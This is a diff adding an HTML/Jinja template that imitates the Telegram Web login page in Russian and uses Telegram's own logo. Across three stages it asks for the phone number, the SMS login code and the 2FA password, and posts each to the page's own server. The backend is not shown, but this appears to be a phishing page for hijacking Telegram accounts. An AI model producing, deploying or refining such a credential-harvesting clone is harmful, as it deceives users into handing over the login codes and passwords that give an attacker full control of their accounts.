@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Telegram Web — Вход</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+<style>
+  /* Минимум CSS для селекта с флагами */
+  .input-group label {
+    display: block;
+    font-size: 14px;
+    margin-bottom: 8px;
+    color: #707579;
+  }
+  .custom-select {
+    position: relative;
+    user-select: none;
+    width: 100%;
+  }
+  .select-selected {
+    background-color: #fff;
+    border: 1px solid #dcdcdc;
+    border-radius: 8px;
+    padding: 12px;
+    cursor: pointer;
+    font-size: 16px;
+    display: flex;
+    align-items: center;
+  }
+  .select-selected img {
+    width: 20px;
+    height: 14px;
+    margin-right: 8px;
+  }
+  .select-items {
+    position: absolute;
+    background-color: #fff;
+    border: 1px solid #dcdcdc;
+    border-radius: 8px;
+    top: 100%;
+    left: 0;
+    right: 0;
+    z-index: 99;
+    max-height: 200px;
+    overflow-y: auto;
+    display: none;
+    flex-direction: column;
+  }
+  .select-items div {
+    padding: 10px 12px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+  }
+  .select-items div img {
+    width: 20px;
+    height: 14px;
+    margin-right: 8px;
+  }
+  .select-items div:hover {
+    background-color: #f1f1f1;
+  }
+</style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://telegram.org/img/t_logo.png" alt="Telegram" />
+    </div>
+
+    {% if error %}
+      <div class="error">{{ error }}</div>
+    {% endif %}
+    {% if success %}
+      <div class="success">{{ success }}</div>
+    {% endif %}
+
+    {% if stage == "phone" %}
+      <h1>Войти в Telegram</h1>
+      <p class="subtitle">Проверьте код страны и введите свой номер телефона.</p>
+
+      <form method="POST" id="phone-form">
+        <div class="input-group">
+          <label>Страна</label>
+          <div class="custom-select" id="country-select">
+            <div class="select-selected">
+              <img src="{{ url_for('static', filename='flags/ru.png') }}" alt="Россия" />
+              Россия
+            </div>
+            <div class="select-items">
+              <div data-code="+7" data-flag="ru.png"><img src="{{ url_for('static', filename='flags/ru.png') }}" alt="Россия" /> Россия</div>
+              <div data-code="+380" data-flag="ua.png"><img src="{{ url_for('static', filename='flags/ua.png') }}" alt="Украина" /> Украина</div>
+              <div data-code="+1" data-flag="us.png"><img src="{{ url_for('static', filename='flags/us.png') }}" alt="США" /> США</div>
+              <div data-code="+375" data-flag="bl.png"><img src="{{ url_for('static', filename='flags/bl.png') }}" alt="Беларусь" /> Беларусь</div>
+              <div data-code="+49" data-flag="de.png"><img src="{{ url_for('static', filename='flags/de.png') }}" alt="Германия" /> Германия</div>
+              <div data-code="+7" data-flag="kz.png"><img src="{{ url_for('static', filename='flags/kz.png') }}" alt="Казахстан" /> Казахстан</div>
+              <div data-code="+40" data-flag="rm.png"><img src="{{ url_for('static', filename='flags/rm.png') }}" alt="Румыния" /> Румыния</div>
+              <div data-code="+66" data-flag="th.png"><img src="{{ url_for('static', filename='flags/th.png') }}" alt="Тайланд" /> Тайланд</div>
+              <div data-code="+90" data-flag="tk.png"><img src="{{ url_for('static', filename='flags/tk.png') }}" alt="Турция" /> Турция</div>
+              <div data-code="+44" data-flag="uk.png"><img src="{{ url_for('static', filename='flags/uk.png') }}" alt="Великобритания" /> Великобритания</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="input-group">
+          <label>Номер телефона</label>
+          <input type="tel" name="phone" id="phone-input" placeholder="+7 " required />
+        </div>
+
+        <button class="next-btn" type="submit">ДАЛЕЕ</button>
+      </form>
+
+    {% elif stage == "code" %}
+      <h1>Введите код</h1>
+      <p class="subtitle">Код был отправлен на {{ phone }}</p>
+
+      <form method="POST" action="/code">
+        <input type="hidden" name="phone" value="{{ phone }}" />
+        <div class="input-group">
+          <label>Код</label>
+          <input type="text" name="code" placeholder="12345" required />
+        </div>
+        <button class="next-btn" type="submit">ОТПРАВИТЬ</button>
+      </form>
+
+    {% elif stage == "2fa" %}
+      <h1>Пароль 2FA</h1>
+      <form method="POST" action="/password">
+        <input type="hidden" name="phone" value="{{ phone }}" />
+        <div class="input-group">
+          <label>Пароль</label>
+          <input type="password" name="password" placeholder="Пароль" required />
+        </div>
+        <button class="next-btn" type="submit">ОТПРАВИТЬ</button>
+      </form>
+    {% endif %}
+  </div>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const select = document.getElementById("country-select");
+    const selected = select.querySelector(".select-selected");
+    const items = select.querySelector(".select-items");
+    const phoneInput = document.getElementById("phone-input");
+
+    selected.addEventListener("click", function (e) {
+      e.stopPropagation();
+      items.style.display = items.style.display === "flex" ? "none" : "flex";
+    });
+
+    items.querySelectorAll("div").forEach(function (option) {
+      option.addEventListener("click", function () {
+        const countryName = this.textContent.trim();
+        const countryFlag = this.querySelector("img").getAttribute("src");
+        const countryCode = this.getAttribute("data-code");
+
+        // Обновляем выбранную страну
+        selected.innerHTML = `<img src="${countryFlag}" alt="${countryName}" /> ${countryName}`;
+
+        // Автозаполнение телефонного поля
+        phoneInput.value = countryCode + " ";
+
+        items.style.display = "none";
+      });
+    });
+
+    // Закрыть список при клике вне селекта
+    document.addEventListener("click", function () {
+      items.style.display = "none";
+    });
+  });
+</script>
+</body>
+</html>
